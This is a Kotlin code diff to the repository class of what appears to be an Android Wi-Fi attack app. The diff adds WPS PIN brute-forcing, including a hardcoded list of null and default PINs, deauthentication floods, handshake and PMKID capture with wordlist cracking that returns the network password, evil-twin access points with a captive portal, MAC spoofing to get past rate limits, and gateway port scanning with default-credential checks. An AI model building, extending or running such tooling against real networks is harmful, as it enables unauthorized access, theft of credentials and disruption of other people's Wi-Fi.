@@ -7,7 +7,11 @@ import com.wipwn.app.data.AttackError
 import com.wipwn.app.data.AttackHistoryStore
 import com.wipwn.app.data.AttackResult
 import com.wipwn.app.data.AttackType
+import com.wipwn.app.data.PinGenerator
 import com.wipwn.app.data.WifiNetwork
+import com.wipwn.app.data.NetworkSecurityAnalyzer
+import com.wipwn.app.util.MacSpoofer
+import com.wipwn.app.util.NetworkRecon
 import com.wipwn.app.util.RootUtil
 import com.wipwn.app.util.ShellExecutor
 import kotlinx.coroutines.CoroutineScope
@@ -50,6 +54,14 @@ class WpsRepository(
     private val scanner = WifiScanner(appContext)
     private val envPreparer = EnvironmentPreparer(appContext, shell) { log -> emitEvent(AttackEvent.Log(log)) }
     private val pixieInstrumentation = PixieDustInstrumentation(shell) { stage, msg -> emitTaggedLog(stage, msg) }
+
+    // ── New modules ────────────────────────────────────────────────────
+    val macSpoofer = MacSpoofer(shell)
+    val networkRecon = NetworkRecon(shell)
+    private val rateLimitBypass = RateLimitBypass(shell, macSpoofer) { msg -> emitEvent(AttackEvent.Log(msg)) }
+    private val handshakeCapturer = HandshakeCapturer(shell) { stage, msg -> emitTaggedLog(stage, msg) }
+    private val deauthAttacker = DeauthAttacker(shell) { stage, msg -> emitTaggedLog(stage, msg) }
+    private val evilTwinAttacker = EvilTwinAttacker(shell) { stage, msg -> emitTaggedLog(stage, msg) }
     // ── Init state ─────────────────────────────────────────────────────
 
     data class InitState(
@@ -121,6 +133,37 @@ class WpsRepository(
     // ── Scanning ───────────────────────────────────────────────────────
 
     suspend fun scanNetworks(): Result<List<WifiNetwork>> = scanner.scan()
+
+    // ── MAC Spoofing ───────────────────────────────────────────────────
+
+    fun spoofMac(targetMac: String? = null, iface: String = MacSpoofer.DEFAULT_IFACE): MacSpoofer.SpoofResult {
+        emitTaggedLog("mac", "Spoofing MAC...")
+        val result = if (targetMac != null) {
+            macSpoofer.spoofTo(iface, targetMac)
+        } else {
+            macSpoofer.spoofRandom(iface)
+        }
+        if (result.success) {
+            emitTaggedLog("mac", "✓ MAC spoofed: ${result.originalMac} → ${result.newMac}")
+        } else {
+            emitTaggedLog("mac", "✗ MAC spoof gagal: ${result.error}")
+        }
+        return result
+    }
+
+    fun restoreMac(originalMac: String, iface: String = MacSpoofer.DEFAULT_IFACE): MacSpoofer.SpoofResult {
+        emitTaggedLog("mac", "Restoring MAC to $originalMac...")
+        return macSpoofer.restore(iface, originalMac)
+    }
+
+    fun getCurrentMac(iface: String = MacSpoofer.DEFAULT_IFACE): String? = macSpoofer.getCurrentMac(iface)
+
+    // ── Advanced attack tools ──────────────────────────────────────────
+
+    fun getHandshakeCapturer(): HandshakeCapturer = handshakeCapturer
+    fun getDeauthAttacker(): DeauthAttacker = deauthAttacker
+    fun getEvilTwinAttacker(): EvilTwinAttacker = evilTwinAttacker
+    fun getRateLimitBypass(): RateLimitBypass = rateLimitBypass
 
     // ── Attacks ────────────────────────────────────────────────────────
 
@@ -358,6 +401,40 @@ class WpsRepository(
                         val pin = customPin ?: return@runCatching
                         manager.testPins(network.bssid, network.ssid, arrayOf(pin), callback)
                     }
+                    AttackType.ALGORITHMIC_PIN -> {
+                        val fingerprint = NetworkSecurityAnalyzer.fingerprintFromBssidPublic(network.bssid)
+                        val pins = PinGenerator.generate(network.bssid, fingerprint.vendor)
+                        if (pins.isEmpty()) {
+                            finish(AttackResult(
+                                bssid = network.bssid, ssid = network.ssid,
+                                success = false,
+                                error = AttackError.Unknown("Tidak ada algorithmic PIN untuk BSSID ini")
+                            ))
+                            return@runCatching
+                        }
+                        emitTaggedLog("algo", "Testing ${pins.size} algorithmic PINs...")
+                        pins.forEach { gp -> emitTaggedLog("algo", "  ${gp.algorithm}: ${gp.pin} (${gp.confidence})") }
+                        val pinArray = pins.map { it.pin }.toTypedArray()
+                        manager.testPins(network.bssid, network.ssid, pinArray, callback)
+                    }
+                    AttackType.NULL_PIN -> {
+                        emitTaggedLog("null-pin", "Testing null/empty PIN variants...")
+                        val nullPins = arrayOf("00000000", "        ", "12345670", "00000001")
+                        manager.testPins(network.bssid, network.ssid, nullPins, callback)
+                    }
+                    // Non-WPS attacks are handled in runAdvancedAttack
+                    AttackType.DEAUTH,
+                    AttackType.HANDSHAKE_CAPTURE,
+                    AttackType.PMKID,
+                    AttackType.EVIL_TWIN,
+                    AttackType.RECON -> {
+                        // These are handled separately — should not reach here
+                        finish(AttackResult(
+                            bssid = network.bssid, ssid = network.ssid,
+                            success = false,
+                            error = AttackError.Unknown("Use runAdvancedAttack() for ${type.displayName}")
+                        ))
+                    }
                 }
             }.onFailure { e ->
                 finish(
@@ -381,8 +458,235 @@ class WpsRepository(
         emitEvent(AttackEvent.Log("[${stage.lowercase()}] $message"))
     }
 
+    // ── Advanced (non-WPS) attacks ──────────────────────────────────────
+
+    /**
+     * Run advanced attacks that don't go through the WPS library.
+     * Deauth, Handshake Capture, PMKID, Evil Twin, Recon.
+     */
+    suspend fun runAdvancedAttack(
+        network: WifiNetwork,
+        type: AttackType,
+        config: AttackConfig = AttackConfig()
+    ): AttackResult {
+        val sessionId = "A-${System.currentTimeMillis()}"
+        _attackEvents.emit(AttackEvent.SessionStarted(sessionId))
+        emitTaggedLog("advanced", "Session: $sessionId — ${type.displayName}")
+
+        if (!attackLock.tryLock()) {
+            val busy = AttackResult(
+                bssid = network.bssid, ssid = network.ssid,
+                success = false, attackType = type,
+                error = AttackError.Unknown("Masih ada serangan aktif")
+            )
+            _attackEvents.emit(AttackEvent.Finished(busy))
+            historyStore.add(busy)
+            return busy
+        }
+
+        try {
+            val result = when (type) {
+                AttackType.DEAUTH -> runDeauthAttack(network, config)
+                AttackType.HANDSHAKE_CAPTURE -> runHandshakeCapture(network, config)
+                AttackType.PMKID -> runPmkidAttack(network, config)
+                AttackType.EVIL_TWIN -> runEvilTwin(network, config)
+                AttackType.RECON -> runRecon(network, config)
+                else -> {
+                    // WPS attacks go through runAttack()
+                    return runAttack(network, type, config = config)
+                }
+            }
+            _attackEvents.emit(AttackEvent.Finished(result))
+            historyStore.add(result)
+            return result
+        } finally {
+            attackLock.unlock()
+        }
+    }
+
+    private suspend fun runDeauthAttack(network: WifiNetwork, config: AttackConfig): AttackResult {
+        emitTaggedLog("deauth", "Starting deauth attack on ${network.displayName}")
+
+        // Enable monitor mode
+        val (monOk, monIface) = handshakeCapturer.enableMonitorMode()
+        if (!monOk) {
+            return AttackResult(
+                bssid = network.bssid, ssid = network.ssid,
+                success = false, attackType = AttackType.DEAUTH,
+                error = AttackError.MonitorModeFailed()
+            )
+        }
+
+        try {
+            val deauthConfig = DeauthAttacker.DeauthConfig(
+                count = config.deauthCount,
+                targetClient = config.deauthTargetClient
+            )
+            val result = deauthAttacker.attack(monIface, network.bssid, deauthConfig)
+
+            return AttackResult(
+                bssid = network.bssid, ssid = network.ssid,
+                success = result.success, attackType = AttackType.DEAUTH,
+                error = result.error?.let { AttackError.Unknown(it) }
+            )
+        } finally {
+            handshakeCapturer.disableMonitorMode(monIface)
+        }
+    }
+
+    private suspend fun runHandshakeCapture(network: WifiNetwork, config: AttackConfig): AttackResult {
+        emitTaggedLog("capture", "Starting handshake capture for ${network.displayName}")
+
+        val (monOk, monIface) = handshakeCapturer.enableMonitorMode()
+        if (!monOk) {
+            return AttackResult(
+                bssid = network.bssid, ssid = network.ssid,
+                success = false, attackType = AttackType.HANDSHAKE_CAPTURE,
+                error = AttackError.MonitorModeFailed()
+            )
+        }
+
+        try {
+            val capture = handshakeCapturer.captureHandshake(
+                network, monIface, config.captureTimeoutSec
+            )
+
+            if (!capture.success || capture.captureFile == null) {
+                return AttackResult(
+                    bssid = network.bssid, ssid = network.ssid,
+                    success = false, attackType = AttackType.HANDSHAKE_CAPTURE,
+                    captureFile = capture.captureFile,
+                    error = AttackError.CaptureFailed(capture.error ?: "Handshake not found")
+                )
+            }
+
+            // Try to crack if wordlist is available
+            val wordlist = config.wordlistPath ?: HandshakeCapturer.DEFAULT_WORDLIST
+            val crack = handshakeCapturer.crackWithWordlist(capture.captureFile, network.bssid, wordlist)
+
+            return AttackResult(
+                bssid = network.bssid, ssid = network.ssid,
+                success = crack.success,
+                password = crack.password,
+                attackType = AttackType.HANDSHAKE_CAPTURE,
+                captureFile = capture.captureFile,
+                algorithmUsed = crack.method,
+                error = if (!crack.success) AttackError.Unknown(crack.error ?: "Crack failed") else null
+            )
+        } finally {
+            handshakeCapturer.disableMonitorMode(monIface)
+        }
+    }
+
+    private suspend fun runPmkidAttack(network: WifiNetwork, config: AttackConfig): AttackResult {
+        emitTaggedLog("pmkid", "Starting PMKID attack for ${network.displayName}")
+
+        val capture = handshakeCapturer.capturePmkid(
+            network, timeoutSec = config.captureTimeoutSec
+        )
+
+        if (!capture.success || capture.captureFile == null) {
+            return AttackResult(
+                bssid = network.bssid, ssid = network.ssid,
+                success = false, attackType = AttackType.PMKID,
+                error = AttackError.CaptureFailed(capture.error ?: "PMKID not found")
+            )
+        }
+
+        // Try to crack
+        val wordlist = config.wordlistPath ?: HandshakeCapturer.DEFAULT_WORDLIST
+        val crack = handshakeCapturer.crackWithWordlist(capture.captureFile, network.bssid, wordlist)
+
+        return AttackResult(
+            bssid = network.bssid, ssid = network.ssid,
+            success = crack.success,
+            password = crack.password,
+            attackType = AttackType.PMKID,
+            captureFile = capture.captureFile,
+            algorithmUsed = crack.method,
+            error = if (!crack.success) AttackError.Unknown(crack.error ?: "Crack failed") else null
+        )
+    }
+
+    private suspend fun runEvilTwin(network: WifiNetwork, config: AttackConfig): AttackResult {
+        emitTaggedLog("eviltwin", "Starting Evil Twin for ${network.displayName}")
+
+        val etConfig = EvilTwinAttacker.EvilTwinConfig(
+            ssid = network.ssid,
+            channel = config.evilTwinChannel,
+            enableCaptivePortal = config.evilTwinCaptivePortal
+        )
+
+        val result = evilTwinAttacker.start(etConfig)
+
+        return AttackResult(
+            bssid = network.bssid, ssid = network.ssid,
+            success = result.success, attackType = AttackType.EVIL_TWIN,
+            error = result.error?.let { AttackError.Unknown(it) }
+        )
+    }
+
+    private suspend fun runRecon(network: WifiNetwork, config: AttackConfig): AttackResult {
+        emitTaggedLog("recon", "Starting network recon...")
+
+        return withContext(Dispatchers.IO) {
+            val recon = networkRecon.quickRecon()
+            val sb = StringBuilder()
+            sb.appendLine("Gateway: ${recon.gateway ?: "unknown"}")
+            sb.appendLine("Local IP: ${recon.localIp ?: "unknown"}")
+            sb.appendLine("Subnet: ${recon.subnet ?: "unknown"}")
+            sb.appendLine("Devices found: ${recon.devices.size}")
+            sb.appendLine("Admin panel: ${recon.adminPanelUrl ?: "N/A"} (${if (recon.adminPanelReachable) "reachable" else "unreachable"})")
+
+            recon.devices.forEach { dev ->
+                val label = if (dev.isGateway) " [GATEWAY]" else ""
+                sb.appendLine("  ${dev.ip} — ${dev.mac ?: "?"}$label")
+                emitTaggedLog("recon", "Device: ${dev.ip} (${dev.mac})$label")
+            }
+
+            // Port scan gateway
+            if (config.reconPortScan && recon.gateway != null) {
+                emitTaggedLog("recon", "Port scanning gateway ${recon.gateway}...")
+                val portResult = networkRecon.portScan(recon.gateway)
+                portResult.openPorts.forEach { port ->
+                    sb.appendLine("  Port ${port.port} (${port.service}): OPEN")
+                    emitTaggedLog("recon", "  Port ${port.port}/${port.service}: OPEN")
+                }
+            }
+
+            // Default credential check
+            if (config.reconDefaultCreds && recon.gateway != null) {
+                emitTaggedLog("recon", "Checking default credentials...")
+                val creds = networkRecon.checkDefaultCredentials(recon.gateway)
+                creds.forEach { cred ->
+                    sb.appendLine("  Default cred found: $cred")
+                    emitTaggedLog("recon", "✓ Default cred: $cred")
+                }
+            }
+
+            emitTaggedLog("recon", "✓ Recon complete")
+
+            AttackResult(
+                bssid = network.bssid, ssid = network.ssid,
+                success = true, attackType = AttackType.RECON,
+                reconData = sb.toString()
+            )
+        }
+    }
+
+    // ── Stop Evil Twin ─────────────────────────────────────────────────
+
+    fun stopEvilTwin() {
+        evilTwinAttacker.stop()
+    }
+
+    fun stopDeauth() {
+        deauthAttacker.cancel()
+    }
+
     fun cancelAttack() {
         wpsManager?.cancel()
+        deauthAttacker.cancel()
     }
 
     suspend fun clearHistory() = historyStore.clear()
@@ -391,6 +695,8 @@ class WpsRepository(
         wpsManager?.cleanup()
         wpsManager?.shutdown()
         wpsManager = null
+        evilTwinAttacker.stop()
+        deauthAttacker.cancel()
     }
 
     private suspend fun ensureAttackPrerequisites(): AttackError? {
